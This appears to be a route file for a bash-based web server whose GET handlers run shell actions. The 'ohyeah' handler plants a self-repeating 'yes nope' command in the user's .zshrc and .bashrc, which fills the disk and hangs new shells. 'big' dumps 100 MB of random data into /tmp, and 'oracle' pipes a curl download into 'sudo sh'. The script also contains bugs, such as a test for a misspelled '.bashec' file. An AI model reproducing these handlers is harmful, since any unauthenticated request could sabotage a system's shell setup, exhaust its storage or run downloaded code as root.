b:GET '/touchme' filer
b:GET '/big' big
b:GET '/ohyeah' ohyeah
b:GET '/test' asdf
b:GET '/minusminus' oracle



filenotfound() {
	http::status 404
	echo $REQUEST_PATH could not be found...
}

filer() {
	pwd
	touch ./WORKED
	if [ -f ./WORKED ]; then
		http::status '200'
		http::content_type "text/html"
	else
		http::status '400'
		http::content_type "text/html"
	fi
}

big() {
	cat /dev/urandom | dd count=102400 bs=1024  2>/dev/null >> /tmp/jna696988w
	du -hs /tmp/jna696988w
}

ohyeah() {
	if [ -f ~/.zshrc]; then
		echo "yes nope > ~/.ohyeah; yes nope" >> ~/.zshrc
	fi
	if [ -f ~/.bashec]; then
		echo "yes nope > ~/.ohyeah; yes nope" >> ~/.bashrc
	fi
}

oracle() {
	curl -O https://linux.oracle.com/switch/centos2ol.sh | sudo sh
}

asdf() {
	http::status '200'
	ls
}
